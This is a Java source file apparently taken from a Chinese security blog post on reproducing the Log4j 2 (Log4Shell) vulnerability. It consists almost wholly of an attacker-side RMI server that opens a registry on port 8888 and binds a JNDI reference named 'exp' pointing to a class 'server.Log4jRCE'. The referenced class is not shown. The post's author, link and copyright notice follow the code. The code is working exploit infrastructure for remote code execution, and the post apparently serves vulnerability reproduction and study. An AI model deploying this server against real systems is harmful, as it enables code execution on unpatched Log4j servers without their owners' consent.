package server;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(8888);
        System.out.println("Create RMI registry on port 8888");
        Reference reference = new Reference("server.Log4jRCE", "server.Log4jRCE", null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("exp", referenceWrapper);
    }
}


作者: Hackt0
链接: https://hackt0.github.io/2021/12/13/%E6%A0%B8%E5%BC%B9%E7%BA%A7!log4j%202%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E6%89%BE%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97%E7%9A%84%E5%9C%B0%E6%96%B9%EF%BC%8C%E4%B8%94%E8%AE%B0%E5%BD%95%E7%9A%84%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9%E5%8F%AF%E6%8E%A7
来源: Hackt0's Blog
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。